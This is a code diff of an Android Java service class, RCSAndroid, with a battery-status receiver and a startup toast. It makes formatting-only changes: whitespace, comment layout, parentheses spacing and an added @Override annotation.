@@ -22,14 +22,16 @@ import android.widget.Toast;
  * The Class RCSAndroid.
  */
 public class RCSAndroid extends Service {
-	
+
 	/** The core. */
 	private CoreThread core;
-	
+
 	/** The battery receiver. */
 	BroadcastReceiver batteryReceiver;
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see android.app.Service#onBind(android.content.Intent)
 	 */
 	@Override
@@ -37,7 +39,9 @@ public class RCSAndroid extends Service {
 		return null;
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see android.app.Service#onCreate()
 	 */
 	@Override
@@ -47,7 +51,7 @@ public class RCSAndroid extends Service {
 		registerListeners();
 		Toast.makeText(this, "Que - Service Created", Toast.LENGTH_LONG).show();
 
-		Status.setAppContext( getApplicationContext( ));
+		Status.setAppContext(getApplicationContext());
 	}
 
 	/**
@@ -67,6 +71,7 @@ public class RCSAndroid extends Service {
 			int voltage = -1;
 			int temp = -1;
 
+			@Override
 			public void onReceive(final Context context, final Intent intent) {
 				level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
 				scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
@@ -88,7 +93,9 @@ public class RCSAndroid extends Service {
 		unregisterReceiver(batteryReceiver);
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see android.app.Service#onDestroy()
 	 */
 	@Override
@@ -107,7 +114,9 @@ public class RCSAndroid extends Service {
 				.show();
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see android.app.Service#onStart(android.content.Intent, int)
 	 */
 	@Override
